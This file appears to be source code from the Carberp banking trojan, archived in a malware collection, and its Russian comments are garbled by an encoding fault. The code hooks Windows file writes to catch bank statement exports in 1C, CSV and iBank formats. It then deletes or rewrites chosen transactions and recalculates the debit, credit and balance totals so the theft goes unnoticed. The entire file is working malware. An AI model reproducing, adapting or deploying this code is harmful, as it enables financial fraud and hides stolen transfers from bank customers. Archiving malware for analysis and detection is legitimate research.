/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
// #include "Ibank.h"
#include "IBankExport.h"
//#ifdef RuBnkH
#include "Strings.h"
#include "Utils.h"

#include "BotDebug.h"

namespace IBANKEXPORT
{
	#include "DbgTemplates.h"
}

typedef BOOL ( WINAPI *PCloseHandle)( HANDLE hObject );
typedef BOOL ( WINAPI *PWriteFile)( HANDLE hFile, LPCVOID lpBuffer,	DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped );
extern PWriteFile Real_WriteFile;

// ��������� ������ ������ ���������� �����
#define DBG IBANKEXPORT::DBGOutMessage<>

//��������� � ������� ���������� ���������� � ������� �������� ������ �������� � �� �������
struct SExpData
{
	HANDLE file; //�������� ����, ���� 0, �� �� ������������ (��������� �����)
	char* data; //������� ������
	int sz; //���������� ���� � data
	int szData; //���������� ���������� ������ � data
	char format; //������ ������: 0 - ����������, 1 - 1�, 2 - csv, 3 - ibank
	int pos; //������� � ������� ������ ������������ ������ ������� �����, ����� ����� �������� �� ������ �����
};

//���������� � ��������� ������� ����� �������� ��� �������
struct SExpSettings
{
	int oper; //����� �������� �����������: 0 - �������� ��������, 1 - ������ ������
	char num[8]; //����� ��������
	char amount[16]; //�����
	SExpSettings* next;
};

SExpData* sexpFiles = 0; //������ ��� ������������� ���������� ������
const int MaxSExpFiles = 10; //������ ������� SExpFiles, ��� ������������ ���������� ������ ������� ����� ������������ ��������������

SExpSettings* expSettings = 0; //����������� �� ��� ���������

//�������� ������� � CSV �������
static char* fieldsCSV[] =
{
	"����� ���������", //0
	"�����" //1 - �����
};

static char* fields1C[] =
{
	"�����", //0
	"�����"  //1
};

static char* fieldsIBank[] =
{
	"DOC_NUM", //0
	"AMOUNT"   //1
};

const int CountFields = 2; //���������� ������������ �����

static void ReleaseSettings()
{
	SExpSettings* curr = expSettings;
	while( curr )
	{
		SExpSettings* del = curr;
		curr = curr->next;
		HEAP::Free(del);
	}
	expSettings = 0;
}

//������������� ��������
static bool InitSettings( char* ptr, int sz )
{
	bool ret = true;
	char* ptr1 = ptr;
	expSettings = 0;
	SExpSettings** last = &expSettings;  //��������� ������� � ������
	while( sz > 0 && ret )
	{
		SExpSettings setting;
		m_memset( &setting, 0, sizeof(SExpSettings) );
		int id = 0; //�� �������� � ������� ��������� ������
		int state = 0;
		if( *ptr++ == '{' ) //���� ������ ���������
		{
			while( sz > 0 && ret )
			{
				//���� �����, �. �. ��������� � �������� ��� �������
				while( *ptr <= 32 && sz > 0 ) ptr++, sz--; //���������� ��� ����������� �������
				if( sz <= 0 ) break;
				if( *ptr == '}' ) //����� ���������
				{
					ptr++;
					sz--;
					//�������� � ������
					*last = (SExpSettings*)HEAP::Alloc( sizeof(SExpSettings) );
					if( *last == 0 )
					{
						ret = false;
						break;
					}
					m_memcpy( *last, &setting, sizeof(SExpSettings) );
					last = &((*last)->next);
					break;
				}
				char* beg = ptr; //������ ������
				if( state == 2 && *ptr == '=' ) //� ��������� 2 ������ ���� ����������� '='
					ptr++, sz--;
				else
					while( *ptr > 32 && sz > 0 ) ptr++, sz--; //���� ����� ������
				if( sz <= 0 ) break;
				bool err = false;
				int len = ptr - beg; //����� ������
				switch( state )
				{
					case 0: //������ ���� ��������
						setting.oper = (int)pStrToIntA(beg); //��������� ������ � �����, ���� ���� �� ����� �� �������� ������
						break;
					case 1: //������� id ��������
						id = (int)pStrToIntA(beg);
						if( id == 0 ) err = true;
						break;
					case 2: //������� '='
						if( *beg != '=' ) err = true;
						break;
					case 3: //������� �������� ��� ��������
						break;
				}
				if( err ) 
				{
					ret = false;
					break;
				}
				if( state == 3 ) //����� �������� ��������, ������ ���������� ���
				{
					switch( id )
					{
						case 1: //����� ��������
							if( len < sizeof(setting.num) - 1 )
								m_memcpy( &setting.num, beg, len ); //���� � ����� ��� �����, �������� ���� ���������� ���������
							break;
						case 2: //�����
							if( len < sizeof(setting.amount) - 1 )
								m_memcpy( &setting.amount, beg, len );
							break;
					}
					state = 1;
				}
				else
					state++;
			}
		}
		else
			sz--;
	}
	if( !ret )
		ReleaseSettings();
	return ret;
}

//������������� ������ ��� �������� ��������
bool SExpInit(const char* fileSettings)
{
	sexpFiles = (SExpData*)HEAP::Alloc( MaxSExpFiles * sizeof(SExpData) ); //��� ��������� ������ ����� �������� 0 
	if( sexpFiles == 0 ) return false;
	if( fileSettings != 0 )
	{
		expSettings = 0;
		DWORD sz;
		char* ptr = (char*)File::ReadToBufferA( (char*)fileSettings, sz ); //������� ��������� ���� ��������
		bool err = false;
		if( ptr )
		{
			err = !InitSettings( ptr, sz );
			MemFree(ptr);
		}
		else
			err = true;
		if( err ) //�� �������� ���� ��� � ����� ���-�� ����, ������ �������
		{
			SExpRelease();
			return false;
		}
	}
	return true;
}

void SExpRelease()
{
	for( int i = 0; i < MaxSExpFiles; i++ )
		if( sexpFiles[i].data )
			HEAP::Free(sexpFiles[i].data);
	HEAP::Free(sexpFiles);
	sexpFiles = 0;
	ReleaseSettings();
}

bool SExpCreateFile( HANDLE file, LPCWSTR lpFileName )
{
	if( sexpFiles )
	{
		PWCHAR p = WSTR::ScanEnd( (PWCHAR)lpFileName, '.' ); //������ ����������
		if( p ) //���������� ����
		{
			//DWORD hash = WSTR::GetHash( p, 0, true ));
			if( lpFileName[0] != '\\' ) //���������� �������� ������ (���� \\.\PIPE\lsarpc)
			{
				for( int i = 0; i < MaxSExpFiles; i++ )
					if( sexpFiles[i].file == 0 ) //������ ��������
					{
						sexpFiles[i].file = file; //����������
						sexpFiles[i].data = 0;
						sexpFiles[i].sz = 0;
						sexpFiles[i].format = 0;
						return true;
					}
			}
		}
	}
	return false;
}

//���� � ������� sexpFiles ������ file
static SExpData* FindFile(HANDLE file)
{
	if( sexpFiles )
	{
		for( int i = 0; i < MaxSExpFiles; i++ )
			if( sexpFiles[i].file == file )
				return &sexpFiles[i];
	}
	return 0;
}

//�������� ������ � ������ ��� ����������, addSz - �� ������� ������ ����� ������
static void AllocMem( SExpData* info, int addSz )
{
	if( info->data )
	{
		info->sz += addSz;
		if( info->sz > info->szData - 1 ) //����� ������ 1 ������ ��� ������������ ����
		{
			info->szData = info->sz + addSz + 1024; //�������� ������, ����� ����� �� ������������ �����
			info->data = (char*)HEAP::ReAlloc( info->data, info->szData );
		}
	}
	else
	{
		info->szData = addSz + 1024;
		info->sz = addSz;
		info->data = (char*)HEAP::Alloc(info->szData);
	}
}

//��������� ������� �� ��� ������� ����, ���� ��, �� ���������� �����
static bool IsExport(SExpData* info)
{
	bool ret = false;
	//�������� �� ������ 1C
	char* ptr = m_strstr( info->data, "1CClientBankExchange" );
	if( ptr != 0 )
	{
		int pos = ptr - info->data;
		if( pos < 10 ) //��������� ����� ������ ���� � ������
		{
			ptr = m_strstr( info->data, "��������� ���������" );
			pos = ptr - info->data;
			if( pos < 512 ) //��������� "��������� ���������" ������ ���� � ������ �����
			{
				info->format = 1; //������ � ������� 1C
				info->pos = pos;
				ret = true;
			}
		}
	}
	else
	{
		//�������� �� ������ CSV
		ptr = m_strstr( info->data, fieldsCSV[0] ); //���� "����� ���������"
		if( ptr != 0 )
		{
			int pos = ptr - info->data;
			if( pos < 200 )
			{
				info->format = 2; //������ � ������� CSV
				info->pos = pos;
				ret = true;
			}
		}
		else
		{
			//�������� �� ������ ibank
			ptr = m_strstr( info->data, "$OPERS_LIST" );
			if( ptr != 0 )
			{
				int pos = ptr - info->data;
				if( pos < 10 ) //��������� ����� ������ ���� � ������
				{
					ptr = m_strstr( info->data, "$OPERATION" );
					pos = ptr - info->data;
					if( pos < 256 ) //��������� "��������� ���������" ������ ���� � ������ �����
					{
						info->format = 3; //������ � ������� ibank
						info->pos = pos;
						ret = true;
					}
				}
			}
		}
	}
	return ret;
}

//�������� � ����� ������ ����� beg � end ����� ��������� newVal, ���� newVal = 0, �� ������ ���������
//��������� ��������� ���������� ��� ���������� ����. crk - ��������� ����������� beg ��� end, ��� �������� �������������� � ������ ������������� ������
static int ChangeData( SExpData* info, char*& beg, char*& end, char*& crk, const char* newVal )
{
	int len1 = end - beg;
	int len2 = newVal ? m_lstrlen( (char*)newVal) : 0;
	int dlen = len2 - len1; //�� ����� ����� ����������� ��� ���������� ����
	int newSz = info->sz + dlen;
	if( newSz > info->szData ) 
	{
		int p1 = beg - info->data; //���������� �������, ��� ��� ������� ������ ���������
		int p2 = end - info->data;
		int p3 = crk - info->data;
		AllocMem( info, dlen );
		beg = info->data + p1;
		end = info->data + p2;
		crk = info->data + p3;
	}
	if( dlen > 0 ) //����� �����������, �������� � �����
	{
		int to = (end - info->data) + dlen;
		for( int i = newSz + 1; i >= to; i-- )
			info->data[i] = info->data[i - dlen];
	}
	else
	{
		if( dlen < 0 )
		{
			m_memcpy( end + dlen, end, info->sz + 1 - (end - info->data) );
		}
	}
	if( len2 > 0 )
	{
		m_memcpy( beg, newVal, len2 );
	}
	info->sz = newSz;
	return dlen;
}

//���� ���� nameField � ���������� ������ ��� ��������, � � len - ����� ��������
static char* GetValField( char* beg, char* end, const char* nameField, int& len )
{
	char* ptr = 0;
	len = 0;
	for(;;)
	{
		ptr = m_strstr( beg, nameField ); //���� �������� ���� � �������� �� beg �� end
		if( ptr == 0 ) break;
		if( ptr < end )
		{
			ptr += m_lstrlen((char*)nameField);
			if( *ptr == '=' ) //����� �������� ���� ������ ����������� ������ '='
			{
				char* ptr2 = ++ptr;
				while( *ptr2 != '\r' && *ptr2 != '\n' ) ptr2++; //���� �� ����� ������, �� ����������� �����
				len = ptr2 - ptr;
				break;
			}
			else
				beg = ptr + 1; //���� ������
		}
		else
		{
			ptr = 0;
			break;
		}
	}
	return ptr;
}

//��������� ����� � ����� �����, ����� �������� �� 100 � ���������� �������
static LONGLONG SumToInt64( const char* from, int len )
{
	char buf[32]; //���� �������� ����� ��� �����
	char* p = buf;
	while( len-- )
	{
		if( *from != '.' && *from != ',' )
			*p++ = *from;
		from++;
	}
	LONGLONG ret;
	pStrToInt64ExA( buf, 0, &ret );
	return ret;
}

//��������� �����, ����������� � ����� �����, � ������ � ������� ������� �������� ������
static char* Int64ToSum( LONGLONG from, char* to )
{
	typedef int ( WINAPI *fwsprintfA )( LPTSTR lpOut, LPCTSTR lpFmt, ... );
	fwsprintfA _pwsprintfA = (fwsprintfA)GetProcAddressEx( NULL, 3, 0xEA3AF0D7 );
	int len = _pwsprintfA( to, "%03I64d", from ); //03 ������ ��� ���� ����� ��� ���� ������ 1.00 ���� ������ ���������� �����, �. �. ����� = 0, �� � ������ ����� 000, � � ����������� ����� ������� 0.00
	//�������� ������� � ������ ����� ���� ����� (���������� ��� ��������� ����� ������ � ����� ���� ������ �����)
	to[len] = to[len - 1];
	to[len - 1] = to[len - 2];
	to[len - 2] = '.';
	to[len + 1] = 0;
	return to;
}

//������ ���� � �����, ���������� ��� ������� IBank, ��� ��� ��� � ��������� �� �������� ������������� �����, � � ������
//��������������, � ���������� ���� �������������
static char* NegSum( const char* from, char* to )
{
	char* ret = to;
	if( *from == '-' )
		from++;
	else
		*to++ = '-';
	while( *from ) *to++ = *from++;
	*to = 0;
	return ret;
}

bool SExpWriteFile( HANDLE file, LPCVOID buf, DWORD sz )
{
	bool ret = true;
	SExpData* info = FindFile(file);
	if( info )
	{
		int endPos = info->sz; //���� �������� ����� ������
		AllocMem( info, sz ); //�������� ������ ���������� ������
		m_memcpy( info->data + endPos, buf, sz );
		info->data[info->sz] = 0;
		if( info->sz >= 512 && info->format == 0 ) //���� ���������� ������ ���������� ��� ����������� �������, �� ���������� ������
		{
			if( !IsExport(info) ) //�� ���� ������
			{
			//���������, �� ��� ��� ��������
				DWORD bw;
				if( sz != info->sz ) //���� ������ ����� ������ ���������� ������ ��� ����������� �������, �� ���� �� �� ���������, ����� ��� ������ ������� �������
				{
					Real_WriteFile( file, info->data, info->sz, &bw, 0 );
					ret = false;
				}
				HEAP::Free(info->data);
				info->file = 0;
				info->data = 0;
				info->sz = 0;
			}
			//else
			//	DBG( "IEXPORT", "Export format %d", info->format );
		}
	}
	else
		ret = false;
	return ret;
}

//������ ��� ������� 1�
static void Format1C( SExpData* info )
{
	DBG( "IEXPORT", "Format1C" );
	const char* start = "��������������=��������� ���������";
	const char* finish = "��������������";
	const int lenFinish = 14;
	int begBalance = 0, lenBegBalance = 0; //���������� ���������� �������
	int endBalance = 0, lenEndBalance = 0; //���������� ��������� �������
	int sumAdd = 0, lenSumAdd = 0; //����� ���������
	int sumSub = 0, lenSumSub = 0; //����� �������

	char* ptr = m_strstr( info->data, start ); //���� ������ ������ ���������� ���������
	if( ptr == 0 ) return;
	char* ptr2 = m_strstr( info->data, "��������������" );  //� ���� ������ ���� ���� �� �������� ���� ��������
	if( ptr2 == 0 ) return;
	int account = 0, lenAccount; //������ ����� � ����� �����
	ptr2 = GetValField( ptr2, ptr, "��������", lenAccount ); if( ptr2 ) account = ptr2 - info->data;
	//������ ���������� �������� �������� �����
	ptr2 = GetValField( info->data, ptr, "����������������", lenBegBalance ); if( ptr2 ) begBalance = ptr2 - info->data;
	ptr2 = GetValField( info->data, ptr, "��������������", lenSumAdd ); if( ptr2 ) sumAdd = ptr2 - info->data;
	ptr2 = GetValField( info->data, ptr, "������������", lenSumSub ); if( ptr2 ) sumSub = ptr2 - info->data;
	ptr2 = GetValField( info->data, ptr, "���������������", lenEndBalance ); if( ptr2 ) endBalance = ptr2 - info->data;
	//������������ ������ ���� � ����� �����
	LONGLONG valSumAdd = SumToInt64( info->data + sumAdd, lenSumAdd ); 
	LONGLONG valSumSub = SumToInt64( info->data + sumSub, lenSumSub ); 
	LONGLONG valEndBalance = SumToInt64( info->data + endBalance, lenEndBalance ); 
	for(;;)
	{
		char* end = m_strstr( ptr, finish );
		if( end == 0 ) break;
		end += lenFinish;
		while( *((unsigned char*)end) < ' ' && *end != 0 ) end++; //���� �� ������ ��������� ������
		
		int lenNum;
		char* begNum = GetValField( ptr, end, fields1C[0], lenNum );
		if( begNum == 0 ) break;
		SExpSettings* curr = expSettings;
		while( curr )
		{
			//���� ����� ���������
			if( m_lstrncmp( begNum, curr->num, lenNum ) == 0 ) //����� ��������� ������
			{
				//���� ���� �����������, ����� ����� ����� �������� ��������� ��� ���������
				int lenAccount2;
				char* account2 = GetValField( ptr, end, "��������������", lenAccount2 );
				bool debet = true; //�������� ���������
				*(info->data + account + lenAccount) = 0;
				*(account2 + lenAccount2) = 0;
				char c = account2[lenAccount2];
				account2[lenAccount2] = 0; //��� ����������� ���������
				if( lenAccount != lenAccount2 || m_lstrncmp( info->data + account, account2, lenAccount ) != 0 ) //������ ����, ������ �������� ���������
					debet = false;
				account2[lenAccount2] = c;
				if( curr->oper == 0 ) //�������� ���� ��������
				{
					//����� �������� ���� ����� � ��������
					int lenVal;
					char* p = GetValField( ptr, end, fields1C[1], lenVal );
					if( p )
					{
						LONGLONG val = SumToInt64( p, lenVal );
						//������� ����� �� ������
						if( debet ) //������
						{
							valSumSub -= val;
							valEndBalance += val;
						}
						else //������
						{
							valSumAdd -= val;
							valEndBalance -= val;
						}
					}
					//������� ��� ��������
					end += ChangeData( info, ptr, end, begNum, 0 );
				}
				else
				{
					for( int i = 1; i < CountFields; i++ )
					{
						int lenVal;
						char* p = GetValField( ptr, end, fields1C[i], lenVal );
						if( p )
						{
							char* newVal = 0;
							switch( i )
							{
								case 1: //�����
									newVal = curr->amount;
									{
										LONGLONG val1 = SumToInt64( p, lenVal ); //����� � ��������
										LONGLONG val2 = SumToInt64( newVal, m_lstrlen(newVal) ); //����� �����
										LONGLONG val = val2 - val1;
										//������� ������� �� ������
										if( debet ) //������
										{
											valSumSub += val;
											valEndBalance -= val;
										}
										else //������
										{
											valSumAdd += val;
											valEndBalance += val;
										}
									}
									break; 
							}
							if( newVal && newVal[0] ) //���� ���� ��� ��������
							{
								char* p2 = p + lenVal;
								int pptr = ptr - info->data; //���������� ������� �� ������ ������������� ������
								end += ChangeData( info, p, p2, end, newVal );
								ptr = info->data + pptr;
							}
						}
					}
				}
				break;
			}
			curr = curr->next;
		}
		ptr = m_strstr( end, start );
		if( ptr == 0 ) break;
	}
	//�������� �����
	char buf[32];
	//��������������
	char* p1 = info->data + sumAdd;
	char* p2 = p1 + lenSumAdd;
	sumSub += ChangeData( info, p1, p2, p2, Int64ToSum( valSumAdd, buf ) );
	//������������
	p1 = info->data + sumSub;
	p2 = p1 + lenSumSub;
	endBalance += ChangeData( info, p1, p2, p2, Int64ToSum( valSumSub, buf ) );
	//���������������
	p1 = info->data + endBalance;
	p2 = p1 + lenEndBalance;
	ChangeData( info, p1, p2, p2, Int64ToSum( valEndBalance, buf ) );
}

//������ ��� ������� CSV
static void FormatCSV( SExpData* info )
{
	DBG( "IEXPORT", "FormatCSV" );
	char sep = info->data[info->pos - 1]; //����������� ����� info->pos ������� � ������� IsExport()
	//������� ���������� ����� �� ���������� ������������
	char *ptr = info->data;
	int n = 0; //����� �������
	int numClns[CountFields]; //������ ������� 
	for( int i = 0; i < CountFields; i++ ) //� ������ ������ ��� ������� �� �������
		numClns[i] = -1;
	char* beg = ptr;
	while(true) 
	{
		if( *ptr == sep || *ptr == '\r' || *ptr == '\n' || *ptr == 0 ) //���� ����������� �������, ���� ����� ������
		{
			int len = ptr - beg;
			for( int i = 0; i < CountFields; i++ )
				if( m_lstrncmp( beg, fieldsCSV[i], len ) == 0 )
				{
					numClns[i] = n; //���������� ����� ������� ��� ����
				}
			if( *ptr != sep ) break; //����� ������
			beg = ptr + 1;
			n++;
		}
		ptr++;
	}
	while( *ptr < ' ' && *ptr != 0 ) ptr++; //������� ���������� ������, ���� �� ������ ������
	while( *ptr )
	{
		//�������� ��������� ������
		beg = ptr;
		n = 0;
		char *numBeg = ptr, *numEnd = ptr; //������ � ����� �������� ������ ��������� � ������
		while(true) //���� �� ����� ������, ������� ���� �������� ������ ���������
		{
			if( *ptr == sep || *ptr == '\r' || *ptr == '\n' || *ptr == 0 )
			{
				if( n >= 0 )
					if( n == numClns[0] ) //��� ������� �� ��������� ������ ���������
					{
						numEnd = ptr;
						n = -1; //������ ������ �� �����
					}
					else
					{
						numBeg = ptr + 1;
						n++;
					}
				if( *ptr != sep ) break; //�� ����� ������
			}
			ptr++; 
		}
		char* end = ptr;
		while( *ptr < ' ' && *ptr != 0 ) ptr++; //���� ������ ���� ������
		//���������� �� ���������� � �������� �� ��������� ��������� ��������
		int numLen = numEnd - numBeg; //����� �������� ������ ���������
		//printf( "%x-%x=%d\n", numBeg - info->data, numEnd - info->data, numLen );
		SExpSettings* curr = expSettings;
		while( curr )
		{
			if( m_lstrncmp( numBeg, curr->num, numLen ) == 0 ) //������ ��� ������� ���������, �. �. ����� ��������� ������
			{
				if( curr->oper == 0 ) //�������� ������
				{
					ChangeData( info, beg, ptr, end, 0 );
					ptr = beg; //��������� ������
				}
				else //������ ������
				{
					char* p = beg;
					n = 0;
					int ll = ptr - end; //����� ��� ���������� �������� ptr ������������ end, ��� ��� ��-�� ������������� ������ ptr ����� ���� ������������
					while( p < end ) //����������� ������� 
					{
						if( *p == sep )
						{
							for( int i = 1; i < CountFields; i++ )
								if( n == numClns[i] )
								{
									char* newVal = 0;
									switch( i )
									{
										case 1:  //�����
											newVal = curr->amount;
											break;
									}
									if( newVal && newVal[0] ) //���� ���� ��� ��������
									{
										int dlen = ChangeData( info, beg, p, end, newVal );
										p += dlen;
										end += dlen;
									}
								}
							n++;
							beg = p + 1;
						}
						p++;
					}
					ptr = end + ll;
				}
				break;
			}
			curr = curr->next;
		}
	}
}

//������ ��� ������� IBank
static void FormatIBank( SExpData* info )
{
	DBG( "IEXPORT", "FormatIBank" );
	const char* start = "$OPERATION";
	const char* finish = "$OPERATION_END";
	const int lenFinish = 14;
	int begBalance = 0, lenBegBalance = 0; //���������� ���������� �������
	int endBalance = 0, lenEndBalance = 0; //���������� ��������� �������
	int sumAdd = 0, lenSumAdd = 0; //����� ���������
	int sumSub = 0, lenSumSub = 0; //����� �������

	char* ptr = m_strstr( info->data, start ); //���� ������ ������ ���������� ���������
	if( ptr == 0 ) return;
	//������ ���������� �������� �������� �����
	char* ptr2 = GetValField( info->data, ptr, "IN_REST", lenBegBalance ); if( ptr2 ) begBalance = ptr2 - info->data;
	ptr2 = GetValField( info->data, ptr, "CREDIT", lenSumAdd ); if( ptr2 ) sumAdd = ptr2 - info->data;
	ptr2 = GetValField( info->data, ptr, "DEBET", lenSumSub ); if( ptr2 ) sumSub = ptr2 - info->data;
	ptr2 = GetValField( info->data, ptr, "OUT_REST", lenEndBalance ); if( ptr2 ) endBalance = ptr2 - info->data;
	//������������ ������ ���� � ����� �����
	LONGLONG valSumAdd = SumToInt64( info->data + sumAdd, lenSumAdd ); 
	LONGLONG valSumSub = SumToInt64( info->data + sumSub, lenSumSub ); 
	LONGLONG valEndBalance = SumToInt64( info->data + endBalance, lenEndBalance ); 
	for(;;)
	{
		char* end = m_strstr( ptr, finish );
		if( end == 0 ) break;
		end += lenFinish;
		while( *((unsigned char*)end) < ' ' && *end != 0 ) end++; //���� �� ������ ��������� ������
		
		int lenNum;
		char* begNum = GetValField( ptr, end, fieldsIBank[0], lenNum );
		if( begNum == 0 ) break;
		SExpSettings* curr = expSettings;
		while( curr )
		{
			//���� ����� ���������
			if( m_lstrncmp( begNum, curr->num, lenNum ) == 0 ) //����� ��������� ������
			{
				if( curr->oper == 0 ) //�������� ���� ��������
				{
					//����� �������� ���� ����� � ��������
					int lenVal;
					char* p = GetValField( ptr, end, fieldsIBank[1], lenVal );
					if( p )
					{
						LONGLONG val = SumToInt64( p, lenVal );
						//������� ����� �� ������
						if( val < 0 ) //������
						{
							valSumSub -= -val;
							valEndBalance += -val;
						}
						else //������
						{
							valSumAdd -= val;
							valEndBalance -= val;
						}
					}
					//������� ��� ��������
					end += ChangeData( info, ptr, end, begNum, 0 );
				}
				else
				{
					for( int i = 1; i < CountFields; i++ )
					{
						int lenVal;
						char* p = GetValField( ptr, end, fieldsIBank[i], lenVal );
						if( p )
						{
							char* newVal = 0;
							char neg[32]; //��� ������ ����� � ������
							switch( i )
							{
								case 1: //�����
									{
										LONGLONG val1 = SumToInt64( p, lenVal ); //����� � ��������
										LONGLONG val2 = SumToInt64( curr->amount, m_lstrlen(curr->amount) ); //����� �����
										if( val1 < 0 ) //������
										{
											LONGLONG val = val2 - (-val1);
											//������� ������� �� ������
											valSumSub += val;
											valEndBalance -= val;
											newVal = NegSum( curr->amount, neg );
										}
										else //������
										{
											LONGLONG val = val2 - val1;
											valSumAdd += val;
											valEndBalance += val;
											newVal = curr->amount;
										}
									}
									break; 
							}
							if( newVal && newVal[0] ) //���� ���� ��� ��������
							{
								char* p2 = p + lenVal;
								int pptr = ptr - info->data; //���������� ������� �� ������ ������������� ������
								end += ChangeData( info, p, p2, end, newVal );
								ptr = info->data + pptr;
							}
						}
					}
				}
				break;
			}
			curr = curr->next;
		}
		ptr = m_strstr( end, start );
		if( ptr == 0 ) break;
	}
	//�������� �����
	char buf[32];
	//���������������
	char* p1 = info->data + endBalance;
	char* p2 = p1 + lenEndBalance;
	sumAdd += ChangeData( info, p1, p2, p2, Int64ToSum( valEndBalance, buf ) );
	//��������������
	p1 = info->data + sumAdd;
	p2 = p1 + lenSumAdd;
	sumSub += ChangeData( info, p1, p2, p2, Int64ToSum( valSumAdd, buf ) );
	//������������
	p1 = info->data + sumSub;
	p2 = p1 + lenSumSub;
	ChangeData( info, p1, p2, p2, Int64ToSum( valSumSub, buf ) );
}

void SExpCloseHandle(HANDLE file)
{
	SExpData* info = FindFile(file);
	if( info )
	{
		if( info->format == 0 ) IsExport(info); //���� ������ �� ��������, �� ������ �����
		//������ ������
		switch( info->format )
		{
			case 1: //1�
				Format1C(info);
				break;
			case 2: //CSV
				FormatCSV(info);
				break;
			case 3: //IBank
				FormatIBank(info);
				break; 
		}
		//��������� � ����
		DWORD bw;
		Real_WriteFile( file, info->data, info->sz, &bw, 0 );
		//������� ������
		HEAP::Free(info->data);
		info->file = 0;
		info->data = 0;
		info->sz = 0;
	}
}
